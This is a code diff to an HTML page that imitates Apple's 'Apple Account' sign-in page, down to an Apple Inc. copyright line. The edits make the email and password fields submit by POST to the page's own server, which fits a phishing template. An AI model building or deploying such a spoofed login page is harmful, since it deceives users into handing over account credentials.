@@ -6,7 +6,8 @@
     <title>Apple Account</title>
     <link rel="stylesheet" href="style.css">
 </head>
-<body class="landing-view"> <header class="top-nav hidden">
+<body class="landing-view"> 
+    <header class="top-nav hidden">
         <span class="nav-title">Apple Account</span>
         <div class="nav-icon">
             <svg width="18" height="18" viewBox="0 0 18 18"><path d="M15 6l-6 6-6-6" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
@@ -28,21 +29,22 @@
             <h1 class="login-header">Apple Account</h1>
             <p class="login-sub">Manage your Apple Account</p>
 
-            <form id="loginForm">
+            <form id="loginForm" method="POST" action="">
                 <div class="input-wrapper">
-                    <input type="email" id="email" placeholder="Email or Phone Number" required>
+                    <input type="email" name="email" id="email" placeholder="Email or Phone Number" required>
+                    
                     <div id="password-section" class="field-collapsed">
-                        <input type="password" id="password" placeholder="Password">
+                        <input type="password" name="password" id="password" placeholder="Password">
                     </div>
                 </div>
 
                 <div class="options-row">
-    <div class="remember-container">
-        <input type="checkbox" id="remember">
-        <label for="remember">Remember me</label>
-    </div>
-    <a href="#" class="forgot-link">Forgotten your password? ↗</a>
-</div>
+                    <div class="remember-container">
+                        <input type="checkbox" id="remember" name="remember">
+                        <label for="remember">Remember me</label>
+                    </div>
+                     <a href="#" class="forgot-link">Forgotten your password? ↗</a>
+                </div>
 
                 <div class="button-group">
                     <button type="submit" id="mainBtn" class="btn-blue">Continue</button>
@@ -71,7 +73,7 @@
             <p class="country">United Kingdom</p>
             <hr>
             <div class="footer-bottom">
-                <span>Copyright © 2026 Apple Inc. All rights reserved.</span>
+                <span>Copyright ©️ 2026 Apple Inc. All rights reserved.</span>
                 <div class="footer-links">
                     <a href="#">Privacy Policy</a>
                     <a href="#">Terms of Use</a>
